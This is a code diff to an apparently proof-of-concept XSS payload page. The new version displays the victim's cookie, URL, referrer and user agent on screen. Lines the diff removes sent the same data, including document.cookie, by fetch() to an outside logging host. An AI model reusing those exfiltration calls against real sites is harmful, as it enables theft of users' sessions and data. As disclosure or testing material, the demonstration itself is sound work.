@@ -1,22 +1,35 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>XSS PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
+    .label { color: #0ff; }
+  </style>
+</head>
 <body>
+<h2>XSS Payload Executed ✅</h2>
+<pre id="output"></pre>
+
 <script>
-  // STEP 1: Run on load
-  alert("🔥 You got XSS via embed!");
-
-  // STEP 2: Exfiltrate data
-  fetch("https://skshadan.me/log?ua=" + navigator.userAgent + "&ts=" + Date.now());
-
-  // Optional: grab more data
+  // Collect info
   const data = {
-    cookie: document.cookie,                      // Usually empty (HttpOnly)
-    location: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent
+    cookie: document.cookie || "[HttpOnly / Empty]",
+    location: window.location.href,
+    referrer: document.referrer || "[none]",
+    userAgent: navigator.userAgent,
+    time: new Date().toISOString()
   };
 
-  fetch("https://skshadan.me/log?" + new URLSearchParams(data));
+  // Display it on screen
+  const out = Object.entries(data).map(
+    ([key, val]) => `[${key.toUpperCase()}]: ${val}`
+  ).join('\n');
+
+  document.getElementById('output').textContent = out;
+
+  // Optional alert (proof it's running)
+  alert("🔥 XSS Executed — Data Shown Below");
 </script>
 </body>
 </html>
